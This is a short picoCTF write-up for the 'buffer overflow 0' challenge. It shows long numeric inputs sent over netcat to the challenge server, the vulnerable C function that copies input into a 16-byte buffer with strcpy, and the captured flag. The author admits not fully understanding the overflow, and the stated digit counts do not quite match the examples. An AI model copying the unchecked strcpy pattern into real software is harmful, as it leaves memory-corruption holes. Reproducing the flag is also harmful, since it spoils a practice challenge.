# buffer overflow 0
* **Difficulty:** MEDIUM
* **Category:** GENERAL SKILLS

### Description
> Let's start off simple, can you overflow the correct buffer? The program is available <a href="https://artifacts.picoctf.net/c/174/vuln">here</a>. You can view source <a href="https://artifacts.picoctf.net/c/174/vuln.c">here.<>

> Additional details will be available after launching your challenge instance.


### Solution 
The challenge is called "buffer overflow" so I thought I'd just input a really big number in when prompted. 

```
$ nc saturn.picoctf.net 50265
Input: 1919278792874093870129834732987410928356834970519874382098563814702394873285638219048378295709183465783247583204987123856734819032984792105896749319802347832910589674657348578910237489
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

That worked! But I still want to know why. What is the minimum number of digits I can enter and still trigger the overflow? To answer that question, I opened the source file provided and took a look. I saw a few character buffers in set to 16.

```C
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

17 Digit Input closes the program: 
```
$ nc saturn.picoctf.net 50222
Input: 123456789012345678
The program will exit now
```

Input of 20 or greater prints the flag
```
$ nc saturn.picoctf.net 50222
Input: 12345678901234567890
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

Great, I got the answer but I still don't really understand whaat is happening here.
